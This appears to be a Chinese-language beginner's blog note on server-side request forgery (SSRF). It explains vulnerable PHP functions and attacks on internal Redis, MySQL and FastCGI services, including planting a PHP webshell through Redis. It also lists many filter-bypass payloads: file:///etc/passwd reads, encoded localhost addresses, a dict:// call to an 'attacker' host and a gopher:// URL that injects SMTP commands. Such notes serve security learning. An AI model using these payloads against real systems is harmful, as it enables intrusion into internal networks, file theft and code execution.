# SSRF


一点SSRF初学笔记

<!--more-->

### 0x1 概述

SSRF(Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统，因为服务器请求天然的可以穿越防火墙。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制。

### 0x2 原理

**SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。**比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。

### 0x3 函数和伪协议

PHP中下面**函数**的使用不当会导致SSRF:

file_get_contents()
fsockopen()
curl_exec()      



**伪协议**

file://：从文件系统中获取文件内容，如，file:///etc/passwd
dict://：字典服务器协议，访问字典资源，如，dict:///ip:6739/info
gopher://：分布式文档传递服务，可使用gopherus生成payload。

### 0x4 SSRF怎么找

能够对外发起网络请求的地方，就可能存在SSRF漏洞。

- 能够对外发起网络请求的地方
- 请求远程服务器资源的地方
- 数据库内置功能
- 邮件系统
- 文件处理
- 在线处理工具

### 0x5 ssrf漏洞利用

#### 1任意文件读取

file://  通过file协议读取本地文件，但只能读取已知文件名的文件

#### 2内网资源探测

利用控制的host字段，来扫描内网存活主机 
若服务器监听127.0.0.1则这个端口只能被本机访问，若监听0.0.0.0，则这个端口可以被外网访问

#### 3gopher协议扩展攻击面

gopher://  负责转发

##### 1攻击redis的6379端口

Redis一般运行在内网，使用者大多将其绑定在127.0.0.1:6379地址，切且一般为空口令，攻击者可以通过SSRF访问内网的redis，由于redis支持通过url形式的访问，来增加、删除、保存内容，所以，攻击者就可以首先增加一个PHP一句话木马的内容到redis，然后备份其文件，就可以将一句话木马保存到硬盘中，实现恶意代码写入

rides是一条指令执行一个行为，如果其中一条指令是错的，会继续读取下一条指令继续执行，所以如果我们能够控制报文的任意一行，就可以将其修改为redis指令，分批执行命令完成攻击

##### 2攻击MySQL的3306端口

攻击内网中的MySQL，我们需要了解其通信协议，MySQL分为服务端和客户端

由客户端连接服务端有四种方式：

1.Unix套接字
2.内存共享
3.命名管道
4.TCP/IP套接字

我们的攻击依靠第四种方式，MySQL客户端连接时：
1.需要密码认证，此时，服务器先发送salt，客户端使用salt进行加密后再验证
2.不需要密码验证，将直接使用上面第四种方式发送数据包

所以，这里攻击MySQL，需要在非交互条件下进行，一定只能攻击没有密码的MySQL服务器

##### 3攻击fastcgi的9000端口

> php-fpm是个中间件，在需要PHP解释器来处理php文本时会用到php-fpm.自从PHP5.3以后将php-fpm继承到php内核中，php-fpm提供了更好的php进程管理方式，可以有效控制内存的进程，可以平滑重载php配置

以我们经常执行访问的`index.php?file=/etc/passwd`为例:

1. 浏览器发送访问index.php的请求到web服务器,比如nginx/apache
2. web服务器将请求的url(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行
3. php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器
4. web服务器收到返回结果后,将http相应传给浏览器

![image-20220925133934213](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/202209251339303.png)

包含配置文件以后，后面紧跟一句

```
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name
```

定义了一个`SCRIPT_FILENAME`,值是`$document_root$fastcgi_script_name`

重点看`SCRIPT_FILENAME`,这个就是nginx传给php-fpm的

nginx和php-fpm的数据交互,使用的是fast-cgi协议

##### fastcgi协议

> fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器.

可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件

ssrf->控制服务端脚本请求本地php-fpm端口->伪造配置参数包含php://input数据->执行php://input内提交的代码

### 0x6 url结构

url结构遵循RFC1738标准，结构如下：

```
URI=scheme:[//authority]path[?query][#fragment]
```

其中authority可以表示为

```
[userinfo@]host[:port]
```

**scheme**由一串大小写不敏感的字符组成，表示获取资源所需要的协议，俗称协议头

**authority**中的userinfo是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要身份验证，格式为username:password@来表示

**host**是指在哪个服务器上获取资源，一般所见可以是域名形式，也可以是IP形式，包括IPv4和IPv6

**port**为服务器端口，http协议默认为80端口，而HTTPS协议默认是443端口，ftp协议是21端口，访问时使用默认端口，可以将端口省略

**path**为资源路径，一般用/进行分层，可以是基于文件的目录，也可以是基于路由的分层

**query**是指查询字符串，这里是可以动态改变的，我们前面也学过，可以用key=value形式的，也可以用index.php/Home/User/Index形式的pathinfo格式

**fragment**表示页面上的片段ID，一般不会跟随浏览器发送到服务器上，页面中一般表示为锚点，用#开头，所以我们在GET请求中，如果要发送#，就必须进行urlencode编码，否则就会认为是锚点

### 0x7 SSRF绕过

#### 1、攻击本地

```
http://127.0.0.1:80
http://localhost:22
```

#### 2、利用[::]

```
利用[::]绕过localhost
http://[::]:80/  >>>  http://127.0.0.1
```

也有看到利用http://0000::1:80/的，但是我测试未成功

#### 3、利用@ 

```
http://example.com@127.0.0.1
```

#### 4、利用短地址

```
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

#### 5、利用特殊域名

利用的原理是DNS解析

```
http://127.0.0.1.xip.io/
```

![image-20230510204514292](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204514292.png)

```
http://www.owasp.org.127.0.0.1.xip.io/
```

![image-20230510204532863](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204532863.png)

#### 6、利用DNS解析

在域名上设置A记录，指向127.0.1

![image-20230510204550556](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204550556.png)

#### 7、利用上传

```
也不一定是上传，我也说不清，自己体会 -.-
修改"type=file"为"type=url"
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF
```

#### 8、利用Enclosed alphanumerics

```
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

![image-20230510204610969](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204610969.png)

#### 9、利用句号

```
127。0。0。1  >>>  127.0.0.1
```

![image-20230510204626984](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204626984.png)

#### 10、利用进制转换

```
可以是十六进制，八进制等。
115.239.210.26  >>>  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x
```

![image-20230510204640080](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204640080.png)

```
http://127.0.0.1  >>>  http://0177.0.0.1/
```

![image-20230510204649311](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204649311.png)

```
http://127.0.0.1  >>>  http://2130706433/
```

![image-20230510204713709](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204713709.png)

```
http://192.168.0.1  >>>  http://3232235521/
http://192.168.1.1  >>>  http://3232235777/
```

![image-20230510204724990](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204724990.png)

#### 11、利用特殊地址

```
http://0/
```

![image-20230510204737890](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230510204737890.png)

#### 12、利用协议

```
Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

#### 13、使用组合

各种绕过进行自由组合即可
